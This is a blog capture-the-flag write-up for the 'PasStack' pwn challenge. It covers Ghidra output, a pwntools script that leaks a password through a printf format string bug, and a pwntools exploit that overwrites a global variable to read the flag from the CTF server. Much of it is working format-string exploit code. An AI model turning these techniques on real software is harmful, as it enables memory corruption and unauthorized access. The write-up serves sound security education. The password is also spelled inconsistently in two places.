---
type: Blog
title: TheCyberThesis'24 - Pwn - PasStack
date: '2024-09-22'
tags: ['ctf', 'pwn', 'thecyberthesis', 'writeup', 'pwntools', 'fmt', 'format string bug']
draft: false
summary: Reading the password from stack, and overwriting the variable to print the flag!
---

## Challenge Description
I heard there's alot buzz about format in the town??!!!
Author: Strangek

## Solution
In this challenge, we were given a binary named "passstack" and password.txt. The security check of this file reveals this, and as the challenge description suggests, this is a format string vulnerability challenge.

![image.png](/static/writeups/pass/1.png)

This is the reverse engineer code from ghidra:

```jsx

int main(void)

{
  int check;
  long in_FS_OFFSET;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  check = pass_check();
  if (check == 0) {
    admin();
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

From this code we can see that two functions are called pass_check and and if we successfully crack the password then we can call admin so let’s analyze pass_check first, this is the pass_check code:

```jsx

undefined8 pass_check(void)

{
  int check;
  FILE *file;
  undefined8 ret;
  char *pcVar1;
  size_t len;
  long in_FS_OFFSET;
  char pass_on_stack [32];
  char input [40];
  long inner_canary;
  
  inner_canary = *(long *)(in_FS_OFFSET + 0x28);
  file = fopen("password.txt","r");
  if (file == (FILE *)0x0) {
    puts("Error opening file!");
    ret = 1;
  }
  else {
    pcVar1 = fgets(pass_on_stack,0x1c,file);
    if (pcVar1 == (char *)0x0) {
      puts("Error reading password from file!");
      fclose(file);
      ret = 1;
    }
    else {
      fclose(file);
      len = strcspn(pass_on_stack,"\n");
      pass_on_stack[len] = '\0';
      printf("Enter password: ");
      fflush(stdout);
      pcVar1 = fgets(input,0x1c,stdin);
      if (pcVar1 == (char *)0x0) {
        puts("Error reading password!");
        ret = 1;
      }
      else {
        len = strcspn(input,"\n");
        input[len] = '\0';
        check = strcmp(pass_on_stack,input);
        if (check == 0) {
          puts("Password correct! Access granted.");
          ret = 0;
        }
        else {
          printf("Incorrect password: %s\n");
          printf(input); //vulnerability
          ret = 1;
        }
      }
    }
  }
  if (inner_canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return ret;
}

```

Here we spotted the first vulnerability of printf, which means that we can get a leak of password from here, because without password we cannot proceed forward, I used this script to get a leak, shoutout to [theflash2k](https://www.theflash2k.me/) for this:

```jsx
#!/usr/bin/env python3
# *~ author: @TheFlash2k

'''
Printing all the specifier's value using PRINTF.
Helps in format string bugs.
'''

from pwn import *
import sys

context.log_level = 'error'

''' Set this to the binary you want to brute-force '''
exe = "passtack"
elf = context.binary = ELF("passtack")

def get_context():
        if args.REMOTE:
                return remote(sys.argv[1], int(sys.argv[2]))
        return process()

''' Set this to the start of the loop '''
INIT_CHECK =0

''' Set this to the max checks you want to run
NOTE: This includes the MAX_CHECK value as well.
'''
MAX_CHECK = 50

''' Print all these specifier's returned value. '''
SPECIFIERS = ['s','p','x'] #SPECIFIERS = ['x','p','lx','s','d']

''' Unhex the output of the following specifiers '''
UNHEX_SPECS = ['x', 'p', 'lx']

f_res = []
for i in range(INIT_CHECK, MAX_CHECK+1):
        res = {}
        res['curr'] = i
        for SPEC in SPECIFIERS:
                try:
                        # io = get_context()
                        io = remote("127.0.0.1",9998)
                        io.sendline(f'|%{i}${SPEC}|'.encode())
                        io.recvline()
                        # io.recvline()
                        io.recvuntil(b'|')
                        buf = io.recvuntil(b'|')[:-1]
                        res[SPEC] = buf
                        if SPEC.lower() in UNHEX_SPECS:
                                if "unhex" not in res.keys(): res["unhex"] = []
                                if res[SPEC][:2] == b"0x": res[SPEC] = res[SPEC][2:]
                                res["unhex"].append({SPEC : unhex(res[SPEC])[::-1]})
                except Exception as E:
                        if SPEC not in res.keys():
                                res[SPEC] = "[ERROR]"
                        pass
        f_res.append(res)
        '''
        The res dictionary will contain everything
        You can control what you want print
        '''
        print(res)
```

These are the results, and boom we leaked the password

![image.png](/static/writeups/pass/2.png)

now let’s just run it on remote server

![image.png](/static/writeups/pass/3.png)

the password is **G00d_b0Y_15_th3_p455w0rd**, lets enter the password and solve the challenge  

![image.png](/static/writeups/pass/4.png)

well, we are still not done yet, let’s reverse engineer the admin function

```jsx

void admin(void)

{
  FILE *__stream;
  long in_FS_OFFSET;
  char local_458 [64];
  char input [1032];
  long inner_canary;
  
  inner_canary = *(long *)(in_FS_OFFSET + 0x28);
  puts("Admin privileges detected. Welcome, Administrator!");
  puts("Is there anything left that you wanna say as closing remarks?");
  fflush(stdout);
  __isoc99_scanf("%1024s",input);
  printf("This is what you said: ");
  printf(input); //vulnerability 
  fflush(stdout);
  if (rights == 0x726f6f74) {
    puts("It seems you\'ve bypassed our security measures. You must possess extraordinary skills.");
    puts("Here is the flag you requested:");
    __stream = fopen("flag.txt","r");
    fgets(local_458,0x40,__stream);
    printf("%s",local_458);
    fclose(__stream);
  }
  else {
    puts("It appears you haven\'t yet met our expectations. You can strive to do better!");
  }
  if (inner_canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

again a printf vulnerability, and a weird check of rights which takes no input, so what we can do here is we overwrite the rights variable through printf and solve the challenge, opeing the file in gdb get the address of rights variable

![image.png](/static/writeups/pass/5.png)

run this script on server and get the flag

```jsx
from pwn import *
context.log_level = "critical"
context.binary = ELF('./passtack')
p = remote('ctf.thecyberthesis.com', 32822 )
# p = process("./passtack")
p.sendline(b'G0oD_b0Y_15_th3_p455w0rd')
p.recvuntil(b'remarks?')	

def exec_fmt(payload):    
    p = remote('ctf.thecyberthesis.com' ,32822)
    # p = process("./passtack")
    p.sendline(b'G0oD_b0Y_15_th3_p455w0rd')
    p.recvuntil(b'remarks?')
    p.sendline(payload)
    p.recvline()
    # p.recvline()
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset #offset=16 (where our input is dropped)
payload = fmtstr_payload(offset, {0x404010 : 0x726f6f74})
print(payload)
p.sendline(payload)
p.recvline()
p.recvline()
p.recvline()
flag = p.recvall()

print("Flag: ", flag)
```

![image.png](/static/writeups/pass/6.png)